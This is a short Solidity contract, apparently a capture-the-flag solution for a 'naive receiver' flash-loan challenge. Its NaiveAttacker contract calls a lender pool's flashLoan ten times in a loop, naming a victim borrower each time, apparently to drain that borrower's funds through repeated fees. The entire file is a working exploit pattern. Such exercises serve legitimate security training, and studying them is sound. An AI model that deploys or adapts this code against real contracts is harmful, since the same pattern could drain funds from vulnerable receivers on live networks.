// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract NaiveAttacker {
    function exploit(INaiveReceiverLenderPool pool, address borrower, uint256 borrowAmount) external {
        for(uint8 i=0;i<10;i++){
            pool.flashLoan(borrower, borrowAmount);
        }
    }
}

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}